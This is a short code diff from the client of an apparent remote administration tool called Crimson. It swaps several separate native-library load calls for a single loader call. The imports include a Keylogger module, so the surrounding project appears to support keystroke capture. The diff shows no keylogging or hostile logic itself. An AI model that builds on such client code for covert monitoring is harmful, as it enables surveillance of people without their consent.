@@ -25,12 +25,12 @@ import org.slf4j.LoggerFactory;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.storage.ClientDB;
 import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.EH;
+import com.subterranean_security.crimson.core.util.Native;
 
 public class Client {
 	private static final Logger log = LoggerFactory.getLogger(Client.class);
@@ -51,9 +51,7 @@ public class Client {
 		Runtime.getRuntime().addShutdownHook(new ShutdownHook());
 
 		// Load native libraries
-		Platform.Advanced.loadLapis();
-		Platform.Advanced.loadSigar();
-		Platform.Advanced.loadJDBC();
+		Native.Loader.load();
 
 		try {
 			clientDB = new ClientDB(new File(Common.Directories.base + "/var/client.db"));
